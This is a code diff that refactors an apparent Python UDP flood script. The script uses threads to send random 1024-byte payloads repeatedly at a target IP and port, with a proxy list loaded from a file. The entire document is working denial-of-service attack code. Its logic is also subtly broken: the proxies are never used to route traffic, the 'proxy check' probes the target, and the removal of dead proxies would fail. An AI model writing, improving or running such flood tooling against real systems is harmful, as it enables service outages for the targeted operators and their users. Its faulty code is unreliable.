@@ -4,39 +4,44 @@ import time
 import sys
 import threading
 
-def udp_attack(target_ip, target_port, duration, proxy_file, rpc):
-    proxies = []
-    try:
-        with open(proxy_file, 'r') as file:
-            proxies = file.read().splitlines()
-    except FileNotFoundError:
-        print(f"Proxy file '{proxy_file}' not found.")
-        return
-
+def udp_attack(target_ip, target_port, duration, proxies, rpc):
     end_time = time.time() + duration
     payload = random._urandom(1024)  # 1024-byte random payload
 
     while time.time() < end_time:
         proxy = random.choice(proxies).split(":")
         if len(proxy) != 2:
-            print(f"Invalid proxy format in '{proxy_file}'. Expected format: IP:PORT")
+            print(f"Invalid proxy format. Expected format: IP:PORT")
             continue
 
         proxy_ip, proxy_port = proxy[0], int(proxy[1])
-
         try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(0.1)  # Set a short timeout for the connection
+            sock.sendto(payload, (target_ip, target_port))  # Send a test packet
+            sock.recvfrom(1024)  # Try to receive a response to check if the proxy is live
+
             for _ in range(rpc):
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 sock.sendto(payload, (target_ip, target_port))
             print(f"Attack successfully sent to {target_ip}:{target_port} with proxy {proxy_ip}:{proxy_port}")
         except Exception as e:
-            print(f"Attack failed, [Reason : {str(e)}]")
+            proxies.remove(proxy)
+            print(f"Attack failed, [Reason : {str(e)}]. Proxy {proxy_ip}:{proxy_port} removed from list.")
+        finally:
+            sock.close()
 
 def start_attack(target_ip, target_port, duration, proxy_file, threads, rpc):
+    try:
+        with open(proxy_file, 'r') as file:
+            proxies = file.read().splitlines()
+    except FileNotFoundError:
+        print(f"Proxy file '{proxy_file}' not found.")
+        sys.exit(1)
+
     thread_list = []
 
     for _ in range(threads):
-        thread = threading.Thread(target=udp_attack, args=(target_ip, target_port, duration, proxy_file, rpc))
+        thread = threading.Thread(target=udp_attack, args=(target_ip, target_port, duration, proxies, rpc))
         thread.start()
         thread_list.append(thread)
 
